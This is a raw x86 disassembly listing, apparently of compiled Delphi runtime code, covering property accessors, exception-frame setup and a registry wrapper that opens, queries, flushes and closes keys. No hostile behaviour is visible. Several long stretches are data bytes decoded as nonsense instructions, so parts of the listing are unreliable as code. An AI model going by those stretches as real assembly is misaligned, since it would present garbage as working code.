call sub_4303c0
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x8 ] eax
mov edx [ esi ]
movsx eax ax
add edx eax
mov eax [ edx ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov ecx edi
mov edx eax
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] esi
mov eax [ ebx + 0x10 ]
cmp eax 0x80000000
jne r-xdata
sub_4302a8
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] ebx
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4303b0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
mov eax [ eax ]
movzx eax [ eax ]
sub al 0x5
je r-xdata
lea ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_430010
mov edx [ ebp - 0x10 ]
mov eax esi
call sub_449f30
jmp r-xdata
sub al 0x5
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4303b7
lea eax [ ebp - 0x14 ]
call sub_4499d8
lea eax [ ebp - 0x10 ]
call sub_449348
retn
dec al
je r-xdata
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_430098
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_449f7c
jmp r-xdata
sub al 0x7
je r-xdata
mov eax [ ebx + 0x4 ]
mov edx eax
and edx 0xff000000
cmp edx 0xff000000
jne r-xdata
jmp r-xdata
cmp edx 0xfe000000
jne r-xdata
mov ebx eax
and ebx 0xffffff
add ebx [ ebp - 0x4 ]
mov eax esi
mov edx [ ebx ]
call sub_449d2c
jmp r-xdata
mov eax esi
xor edx edx
call sub_449d2c
mov [ ebp - 0xc ] eax
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
movsx eax ax
add edx eax
mov eax [ edx ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov ecx esi
mov edx [ ebx + 0x10 ]
mov eax [ ebp - 0x8 ]
call [ ebp - 0xc ]
jmp r-xdata
mov edx esi
mov eax [ ebp - 0x8 ]
call [ ebp - 0xc ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x8 ] eax
cmp [ ebx + 0x10 ] 0x80000000
jne r-xdata
sub_4303c0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov edi ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_4304b6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
mov eax [ eax ]
movzx eax [ eax ]
sub al 0x5
je r-xdata
lea eax [ ebp - 0xc ]
mov edx edi
mov ecx 0x0
call sub_449f58
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax esi
call sub_43005c
jmp r-xdata
sub al 0x5
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4304bd
lea eax [ ebp - 0x10 ]
call sub_4499d8
lea eax [ ebp - 0xc ]
call sub_449348
retn
dec al
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx edi
call sub_449f90
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax esi
call sub_4301ac
jmp r-xdata
sub al 0x7
je r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
and edx 0xff000000
cmp edx 0xff000000
jne r-xdata
jmp r-xdata
cmp edx 0xfe000000
jne r-xdata
mov ebx eax
and ebx 0xffffff
add ebx esi
mov eax ebx
mov edx edi
call sub_449d2c
jmp r-xdata
mov [ ebp - 0x8 ] eax
mov edx [ esi ]
movsx eax ax
add edx eax
mov eax [ edx ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov ecx edi
mov edx eax
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] esi
mov eax [ ebx + 0x10 ]
cmp eax 0x80000000
jne r-xdata
sub_4304c4
push ebx
push esi
add esp 0xffffffec
mov ebx edx
mov edx [ ebx + 0x4 ]
mov ecx edx
and ecx 0xff000000
cmp ecx 0xff000000
jne r-xdata
cmp ecx 0xfe000000
jne r-xdata
mov esi edx
and esi 0xffffff
add esi eax
mov eax [ ebx ]
mov eax [ eax ]
call sub_42f6b8
movzx eax [ eax ]
cmp eax 0x4
ja r-xdata
mov [ esp + 0xc ] edx
mov ecx [ eax ]
movsx edx dx
add ecx edx
mov edx [ ecx ]
mov [ esp + 0xc ] edx
jmp r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
mov [ esp + 0x8 ] ax
jmp r-xdata
jmp [ eax * 4 + jump_table_430504 ]
mov edx eax
mov eax [ esp + 0x10 ]
call [ esp + 0xc ]
fstp [ esp ]
fwait
mov eax [ esp + 0x10 ]
call [ esp + 0xc ]
fstp [ esp ]
fwait
jmp r-xdata
mov [ esp + 0x10 ] eax
mov eax [ ebx + 0x10 ]
cmp eax 0x80000000
jne r-xdata
fld [ esp ]
add esp 0x14
pop esi
pop ebx
retn
fld [ esi ]
fstp [ esp ]
fwait
jmp r-xdata
fld [ esi ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ esi ]
mov [ esp ] eax
mov eax [ esi + 0x4 ]
mov [ esp + 0x4 ] eax
mov ax [ esi + 0x8 ]
mov [ esp + 0x8 ] ax
jmp r-xdata
fild [ esi ]
fstp [ esp ]
fwait
jmp r-xdata
fild [ esi ]
fdiv [ r-xdata ]
fstp [ esp ]
fwait
jmp r-xdata
fld [ esp ]
fdiv [ r-xdata ]
fstp [ esp ]
fwait
mov eax [ ebx ]
mov eax [ eax ]
call sub_42f6b8
cmp [ eax ] 0x4
jne r-xdata
sub_4305dc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov ebx [ esi + 0x8 ]
mov eax [ esi ]
mov eax [ eax ]
call sub_42f6b8
movzx eax [ eax ]
mov edx ebx
and edx 0xff000000
cmp edx 0xff000000
jne r-xdata
cmp edx 0xfe000000
jne r-xdata
mov edx ebx
and edx 0xffffff
add edx edi
and eax 0x7f
cmp eax 0x4
ja r-xdata
mov [ ebp - 0x8 ] ebx
mov edx [ edi ]
movsx ecx bx
add edx ecx
mov edx [ edx ]
mov [ ebp - 0x8 ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
jmp [ eax * 4 + jump_table_430625 ]
and eax 0x7f
cmp eax 0x4
ja r-xdata
and eax 0x7f
cmp eax 0x4
ja r-xdata
mov [ ebp - 0x4 ] edi
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
fld [ ebp + 0x8 ]
fstp [ edx ]
fwait
jmp r-xdata
fld [ ebp + 0x8 ]
fstp [ edx ]
fwait
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp + 0xc ]
mov [ edx + 0x4 ] eax
mov ax [ ebp + 0x10 ]
mov [ edx + 0x8 ] ax
jmp r-xdata
fld [ ebp + 0x8 ]
fistp [ edx ]
fwait
jmp r-xdata
fld [ ebp + 0x8 ]
fmul [ r-xdata ]
fistp [ edx ]
fwait
jmp r-xdata
jmp [ eax * 4 + jump_table_430754 ]
jmp [ eax * 4 + jump_table_4306c1 ]
fld [ ebp + 0x8 ]
add esp 0xfffffffc
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
movzx eax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
fmul [ r-xdata ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
fld [ ebp + 0x8 ]
add esp 0xfffffffc
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
movzx eax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
fmul [ r-xdata ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
sub_4307e8
push esi
push edi
mov edi edx
mov edx [ edi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov esi [ edi + 0x4 ]
cmp [ edi + 0x7 ] 0xfe
ja r-xdata
mov edx ecx
and esi 0xffffff
lea edx [ esi + eax ]
mov eax ecx
call sub_4307d4
pop edi
pop esi
retn
jb r-xdata
call esi
pop edi
pop esi
retn
movsx esi si
add esi [ eax ]
call [ esi ]
pop edi
pop esi
retn
sub_430828
push esi
push edi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov edi [ esi + 0x8 ]
cmp [ esi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and edi 0xffffff
add eax edi
mov edx ecx
call sub_4307d4
pop edi
pop esi
retn
jb r-xdata
call edi
pop edi
pop esi
retn
movsx edi di
add edi [ eax ]
call [ edi ]
pop edi
pop esi
retn
sub_430868
push ebx
push esi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov ebx [ esi + 0x4 ]
cmp [ esi + 0x7 ] 0xfe
ja r-xdata
mov edx ecx
and ebx 0xffffff
add eax ebx
mov edx [ eax ]
mov ebx [ eax + 0x4 ]
mov [ ecx ] edx
mov [ ecx + 0x4 ] ebx
pop esi
pop ebx
retn
jb r-xdata
call ebx
pop esi
pop ebx
retn
movsx ebx bx
add ebx [ eax ]
call [ ebx ]
pop esi
pop ebx
retn
sub_4308a8
push ebx
mov ebx [ edx + 0x8 ]
cmp [ edx + 0xb ] 0xfe
ja r-xdata
and ebx 0xffffff
add eax ebx
mov edx [ ecx ]
mov ebx [ ecx + 0x4 ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
pop ebx
retn
mov edx [ edx + 0x10 ]
push [ ecx + 0x4 ]
push [ ecx ]
jb r-xdata
call ebx
pop ebx
retn
movsx ebx bx
add ebx [ eax ]
call [ ebx ]
pop ebx
retn
sub_4308e0
cmp [ edx + 0x7 ] 0xfe
mov ecx [ edx + 0x4 ]
mov edx [ edx + 0x10 ]
ja r-xdata
and ecx 0xffffff
add eax ecx
mov edx [ eax + 0x4 ]
mov eax [ eax ]
retn
jb r-xdata
call ecx
retn
movsx ecx cx
add ecx [ eax ]
call [ ecx ]
retn
sub_430908
push ebp
mov ebp esp
cmp [ edx + 0xb ] 0xfe
mov ecx [ edx + 0x8 ]
ja r-xdata
and ecx 0xffffff
add eax ecx
mov edx [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
mov edx [ edx + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
jb r-xdata
call ecx
jmp r-xdata
movsx ecx cx
add ecx [ eax ]
call [ ecx ]
jmp r-xdata
pop ebp
retn 0x8
sub_430944
push ebx
push esi
add esp 0xfffffff4
mov [ esp ] ecx
mov ebx edx
mov edx [ ebx + 0x4 ]
mov ecx edx
and ecx 0xff000000
cmp ecx 0xff000000
jne r-xdata
cmp ecx 0xfe000000
jne r-xdata
mov ebx edx
and ebx 0xffffff
add ebx eax
mov eax [ esp ]
mov edx [ ebx ]
call sub_44b8f0
jmp r-xdata
mov [ esp + 0x4 ] edx
mov ecx [ eax ]
movsx edx dx
add ecx edx
mov edx [ ecx ]
mov [ esp + 0x4 ] edx
jmp r-xdata
add esp 0xc
pop esi
pop ebx
retn
mov ecx [ esp ]
mov edx esi
mov eax [ esp + 0x8 ]
call [ esp + 0x4 ]
mov edx [ esp ]
mov eax [ esp + 0x8 ]
call [ esp + 0x4 ]
jmp r-xdata
mov [ esp + 0x8 ] eax
mov esi [ ebx + 0x10 ]
cmp esi 0x80000000
jne r-xdata
sub_4309c4
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ecx [ edx + 0x8 ]
mov ebx ecx
and ebx 0xff000000
cmp ebx 0xff000000
jne r-xdata
cmp ebx 0xfe000000
jne r-xdata
mov ebx ecx
and ebx 0xffffff
add ebx eax
mov eax ebx
mov edx esi
call sub_44b8f0
jmp r-xdata
mov [ esp ] ecx
mov ebx [ eax ]
movsx ecx cx
add ebx ecx
mov ecx [ ebx ]
mov [ esp ] ecx
jmp r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov ecx esi
mov edx eax
mov eax [ esp + 0x4 ]
call [ esp ]
mov edx esi
mov eax [ esp + 0x4 ]
call [ esp ]
jmp r-xdata
mov [ esp + 0x4 ] eax
mov eax [ edx + 0x10 ]
cmp eax 0x80000000
jne r-xdata
sub_430a38
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_430a7e
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_430a85
retn
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_44a7e8
mov eax rw-data
call j_sub_449348
sub_430a90
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
movzx eax [ r-xdata ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_43b648
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_430abd
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_430ae5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_430aec
retn
sub_430afc
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop eax
or eax [ ebx ]
sbb al 0x0
add [ eax ] al
mov esp 0x6c004337
add [ eax + eax + 0x74 ] 0x82
inc esp
add [ eax + 0x4400439e ] al
test [ eax + eax + 0x64 ] al
test [ eax + eax + 0x68 ] al
test [ eax + eax + 0x6c ] al
test [ eax + eax + 0x60 ] al
test [ eax + eax + 0x48 ] al
add [ eax + eax + 0x64 ] 0xd8004481
popfd
inc ebx
add [ eax ] ch
sahf
inc ebx
add [ esi + ebx * 4 ] bl
inc ebx
add [ edx ] dl
inc ebp
push edx
imul esi [ gs : bp + di + 0x74 ] 0x78457972
arpl [ ebp + 0x70 ] sp
je r-xdata
adc [ eax ] al
add [ eax ] al
or [ edx + edx * 2 + 0x65 ] edx
imul esi [ bp + di + 0x74 ] 0x83537972
outsd
outsb
nop
les ecx [ ebx ]
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah al
or eax [ ebx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
salc
or eax [ ebx ]
and [ eax ] al
add [ eax ] al
loopne r-xdata
add al 0x11
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439d44
call sub_448c38
pop ecx
pop edx
pop ebx
retn
inc esp
add [ edx + eax * 4 + 0x44 ] ch
add [ edx + eax * 4 + 0x44 ] dh
add [ esp + eax * 4 + 0x44 ] cl
add [ esp + eax * 4 + 0x44 ] al
add [ esp + eax * 4 + 0x44 ] ah
add [ eax - 0x7c ] ch
inc esp
add [ esp + eax * 4 + 0x44 ] ch
add [ eax - 0x7c ] ah
inc esp
add [ eax - 0x7f ] cl
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
add ah ch
or al 0x43
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add ah al
push esi
inc esp
add [ eax ] dl
add [ eax ] al
add [ ecx ] cl
push esp
push edx
imul esi [ gs : bp + di + 0x74 ] 0x83537972
sub_430be0
push ebx
add esp 0xfffffff8
mov ebx eax
mov [ esp ] ebx
mov [ esp + 0x4 ] 0x11
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439d44
call sub_448c38
pop ecx
pop edx
pop ebx
retn
sub_430c0c
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call j_sub_449880
xor eax eax
push ebp
push sub_430c73
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
cmp [ eax ] 0x5c
sete al
jmp r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
mov ebx eax
xor bl 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_430c7a
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
sub_430c80
cmp eax 0x1
jne r-xdata
cmp eax 0x2
jne r-xdata
mov al 0x1
retn
cmp eax 0x4
jne r-xdata
mov al 0x2
jmp r-xdata
cmp eax 0x3
jne r-xdata
mov al 0x3
jmp r-xdata
retn
xor eax eax
mov al 0x4
jmp r-xdata
sub_430ca8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov edx 0x80000001
mov eax esi
call sub_430d48
mov [ esi + 0x18 ] 0xf003f
mov [ esi + 0xc ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_448694
mov eax esi
pop esi
pop ebx
retn
call sub_4486ec
pop [ fs : 0x0 ]
add esp 0xc
sub_430cec
push ebx
push esi
call sub_44873c
mov ebx edx
mov esi eax
mov eax esi
call sub_430d18
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4481a0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4486e4
sub_430d18
push ebx
mov ebx eax
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
pop ebx
retn
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax [ ebx + 0x4 ]
push eax
call RegCloseKey
xor eax eax
mov [ ebx + 0x4 ] eax
lea eax [ ebx + 0x10 ]
xor edx edx
call sub_449d2c
push eax
call RegFlushKey
sub_430d48
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x8 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x14 ] 0x0
je r-xdata
mov [ ebx + 0x8 ] esi
mov eax ebx
call sub_430d18
push eax
call RegCloseKey
mov [ ebx + 0x14 ] 0x0
sub_430d74
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_430d18
mov [ ebx + 0x4 ] esi
lea eax [ ebx + 0x10 ]
mov edx edi
call sub_449d2c
pop edi
pop esi
pop ebx
retn
sub_430dac
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_430f5d
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_449d80
mov eax [ ebp - 0x4 ]
call sub_430c0c
mov ebx eax
test bl bl
jne r-xdata
xor eax eax
mov [ ebp - 0xc ] eax
mov edi [ esi + 0x18 ]
and edi 0x300
lea eax [ ebp - 0xc ]
push eax
mov eax edi
or eax 0x20019
push eax
push 0x0
mov eax [ ebp - 0x4 ]
call sub_449db8
push eax
mov edx ebx
mov eax esi
call sub_430d98
push eax
call RegOpenKeyExW
test eax eax
sete [ ebp - 0x5 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx 0x1
call sub_44a438
lea eax [ ebp - 0xc ]
push eax
mov eax edi
or eax 0x20009
push eax
push 0x0
mov eax [ ebp - 0x4 ]
call sub_449db8
push eax
mov edx ebx
mov eax esi
call sub_430d98
push eax
call RegOpenKeyExW
test eax eax
sete [ ebp - 0x5 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
or edi 0x20019
mov [ esi + 0x18 ] edi
cmp [ esi + 0x4 ] 0x0
setne al
test al bl
je r-xdata
lea eax [ ebp - 0xc ]
push eax
mov eax edi
or eax 0x1
push eax
push 0x0
mov eax [ ebp - 0x4 ]
call sub_449db8
push eax
mov edx ebx
mov eax esi
call sub_430d98
push eax
call RegOpenKeyExW
test eax eax
sete [ ebp - 0x5 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
or edi 0x20009
mov [ esi + 0x18 ] edi
cmp [ esi + 0x4 ] 0x0
setne al
test al bl
je r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov eax esi
call sub_430d74
jmp r-xdata
push [ esi + 0x10 ]
push r-xdata
push [ ebp - 0x4 ]
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_44a1b8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_430f64
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
or edi 0x1
mov [ esi + 0x18 ] edi
cmp [ esi + 0x4 ] 0x0
setne al
test al bl
je r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov eax esi
call sub_430d74
jmp r-xdata
push [ esi + 0x10 ]
push r-xdata
push [ ebp - 0x4 ]
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_44a1b8
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov eax esi
call sub_430d74
push [ esi + 0x10 ]
push r-xdata
push [ ebp - 0x4 ]
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_44a1b8
sub_430f80
push ebx
push esi
push edi
push ebp
push ecx
mov ebp ecx
mov edi edx
mov esi eax
mov eax ebp
xor ecx ecx
mov edx 0x8
call sub_447ae4
lea eax [ ebp + 0x4 ]
push eax
push 0x0
lea eax [ esp + 0x8 ]
push eax
push 0x0
mov eax edi
call sub_449db8
push eax
mov eax [ esi + 0x4 ]
push eax
call RegQueryValueExW
test eax eax
sete bl
mov eax [ esp ]
call sub_430c80
mov [ ebp ] al
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_430fd0
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
call sub_430f80
test al al
je r-xdata
or eax 0xffffffff
mov eax [ esp + 0x4 ]
jmp r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
sub_430ff8
push ebx
push esi
push edi
push ebp
push ecx
mov edi ecx
mov ebp edx
mov esi eax
mov edx ebp
mov eax esi
call sub_430fd0
mov ebx eax
test ebx ebx
jle r-xdata
mov eax edi
xor edx edx
call sub_449d2c
mov eax edi
mov ecx ebx
xor edx edx
call sub_449e68
push ebx
lea eax [ esp + 0x4 ]
push eax
mov eax [ edi ]
call sub_449db8
mov ecx eax
mov edx ebp
mov eax esi
call sub_431070
cmp [ esp ] 0x1
je r-xdata
mov eax [ edi ]
call sub_449db8
call sub_4360a4
mov edx eax
mov eax edi
call sub_449fd0
jmp r-xdata
cmp [ esp ] 0x2
jne r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_430be0
jmp r-xdata
sub_431070
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
mov [ ebp - 0x4 ] eax
lea eax [ ebp + 0xc ]
push eax
push edi
lea eax [ ebp - 0x4 ]
push eax
push 0x0
mov eax esi
call sub_449db8
push eax
mov eax [ ebx + 0x4 ]
push eax
call RegQueryValueExW
test eax eax
je r-xdata
mov ebx [ ebp + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_430c80
mov edx [ ebp + 0x8 ]
mov [ edx ] al
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov [ ebp - 0xc ] esi
mov [ ebp - 0x8 ] 0x11
lea eax [ ebp - 0xc ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439d44
call sub_448c38
sub_4310fb
inc [ ecx ]
add [ eax ] al
add [ ecx ] dh
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_431140
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_431147
retn
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_44a7e8
sub_431154
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_431179
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_431180
retn
sub_431190
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al dx
adc [ ebx ] eax
sbb al 0x0
add [ eax ] al
mov esp 0x6c004337
add [ eax + eax + 0x74 ] 0x82
inc esp
add [ eax + 0x4400439e ] al
test [ eax + eax + 0x64 ] al
test [ eax + eax + 0x68 ] al
test [ eax + eax + 0x6c ] al
test [ eax + eax + 0x60 ] al
test [ eax + eax + 0x48 ] al
add [ eax + eax + 0x64 ] 0xd8004481
popfd
inc ebx
add [ eax ] ch
sahf
inc ebx
add [ esi + ebx * 4 ] bl
inc ebx
add [ ecx ] dl
inc ebp
dec ecx
outsb
imul eax [ esi + 0x69 ] 0x7845656c
arpl [ ebp + 0x70 ] sp
je r-xdata
adc eax 0x15840043
outsd
outsb
nop
nop
pop eax
adc al [ ebx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax 0x4312
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dl cl
adc al [ ebx ]
or al 0x0
add [ eax ] al
loopne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x34004479 ] dl
push ds
inc ebx
add [ esp + ebx + 0x18900043 ] ah
inc ebx
add al bh
sbb [ ebx ] al
pop eax
sbb [ ebx ] eax
mov esp 0x90004319
jns r-xdata
fcom [ edi ]
inc esp
add [ edx + eax * 4 + 0x44 ] ch
add [ edx + eax * 4 + 0x44 ] dh
add [ esp + eax * 4 + 0x44 ] cl
add [ esp + eax * 4 + 0x44 ] al
add [ esp + eax * 4 + 0x44 ] ah
add [ eax - 0x7c ] ch
inc esp
add [ esp + eax * 4 + 0x44 ] ch
add [ eax - 0x7c ] ah
inc esp
add [ eax - 0x7f ] cl
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
add [ eax - 0x6fffbb7f ] ah
jns r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x6fffbb87 ] dl
jns r-xdata
inc ebx
add [ eax - 0x6fffbb87 ] dl
jns r-xdata
add [ esi + ebx ] dh
inc ebx
add [ edx + ebx + 0x43 ] al
add al dl
sbb al [ ebx ]
mov al 0x15
inc ebx
add [ eax + 0x16 ] ch
inc ebx
add [ eax ] ah
pop ss
inc ebx
add al bl
pop ss
add [ eax - 0x23ffbb87 ] dl
adc eax [ ebx ]
sub [ 0x15840043 ] dl
add [ eax ] al
add [ eax ] al
add [ ebx + edx + 0xc0043 ] dl
add [ eax ] al
add [ edx ] dl
inc ebx
add [ edx + eax * 4 + 0x44 ] ch
add [ edx + eax * 4 + 0x44 ] dh
add [ esp + eax * 4 + 0x44 ] cl
add [ esp + eax * 4 + 0x44 ] al
add [ esp + eax * 4 + 0x44 ] ah
add [ eax - 0x7c ] ch
inc esp
add [ esp + eax * 4 + 0x44 ] ch
add [ eax - 0x7c ] ah
inc esp
add [ eax - 0x7f ] cl
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
add [ eax ] bl
pop ds
inc ebx
